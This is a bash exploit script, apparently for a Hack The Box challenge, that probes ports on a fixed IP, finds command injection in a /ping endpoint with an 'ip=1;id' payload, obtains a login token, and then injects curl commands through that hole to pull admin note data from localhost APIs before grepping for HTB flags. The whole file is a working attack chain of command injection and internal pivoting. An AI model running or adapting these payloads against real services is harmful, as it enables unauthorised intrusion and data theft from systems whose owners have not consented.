#!/usr/bin/env bash
set -euo pipefail
IP=${1:-94.237.49.23}
NMAP_FILE=${2:-/workspace/recon/nmap/tcp_full.nmap}
TO=8
OUT_DIR=/workspace/recon/httpx
TMP_DIR=/workspace/recon/tmp
API_PORT=41412
API_BASE="http://$IP:$API_PORT"
mkdir -p "$OUT_DIR" "$TMP_DIR"
# 1) Build candidate HTTP ports from nmap snapshot
PORTS=$(awk '/\/tcp\s+open\s+.*http/{print $1}' "$NMAP_FILE" | cut -d/ -f1 | sort -n | uniq)
# Ensure common known candidates appended
PORTS="$PORTS 52548 41411 41412 41417 46132 48544 48656 50692 54991 57280 57759"
echo "Candidates: $PORTS" | tee "$OUT_DIR/candidates_http.txt"
# 2) Locate RCE-capable /ping by testing POST injection
RCE_PORT=""
for p in $PORTS; do
  # quick probe of index and /ping
  curl -fsS -m "$TO" --connect-timeout "$TO" -s "http://$IP:$p/" | head -n 10 > "$OUT_DIR/port_${p}_index.head" || true
  RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=1;id' "http://$IP:$p/ping" || true)
  echo "$RES" | head -n 20 > "$OUT_DIR/port_${p}_rce_test.head"
  if echo "$RES" | grep -qiE 'uid=|www-data|linux'; then RCE_PORT=$p; break; fi
  sleep 0.15
done
if [[ -z ${RCE_PORT:-} ]]; then
  # try 52548 explicitly last
  RCE_PORT=52548
fi
echo "$RCE_PORT" | tee "$OUT_DIR/rce_port.txt"
RCE_BASE="http://$IP:$RCE_PORT/ping"
# 3) Fresh token
curl -fsS -m 8 --connect-timeout 8 -H 'Content-Type: application/json' -d '{"email":"a@a.com","password":"a"}' "$API_BASE/api/auth/login" > "$OUT_DIR/login_resp.json"
jq -r .token "$OUT_DIR/login_resp.json" > "$TMP_DIR/token.txt"
TOKEN=$(cat "$TMP_DIR/token.txt")
# 4) Build and send injections to localhost admin endpoints
make_inj() { local body="$1"; local file="$2"; printf "%s" "$body" > "$file"; }
make_inj "ip=1;curl -s -H 'Authorization: Bearer $TOKEN' http://127.0.0.1:41412/api/notes/all" "$TMP_DIR/inj_all.txt"
make_inj "ip=1;curl -s -H 'Authorization: Bearer $TOKEN' 'http://127.0.0.1:41412/api/notes?limit=1000'" "$TMP_DIR/inj_list.txt"
make_inj "ip=1;curl -s -H 'Authorization: Bearer $TOKEN' http://127.0.0.1:41412/api/auth/verify" "$TMP_DIR/inj_verify.txt"
# Execute
curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@$TMP_DIR/inj_all.txt"  "$RCE_BASE" > "$OUT_DIR/localhost_notes_all.json" || true
curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@$TMP_DIR/inj_list.txt" "$RCE_BASE" > "$OUT_DIR/localhost_notes_list.json" || true
curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@$TMP_DIR/inj_verify.txt" "$RCE_BASE" > "$OUT_DIR/localhost_verify.json" || true
# 5) Search for HTB flags in all outputs
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR" > "$OUT_DIR/htb_hits.txt" || true
# Print summary
sed -n '1,200p' "$OUT_DIR/htb_hits.txt" || true
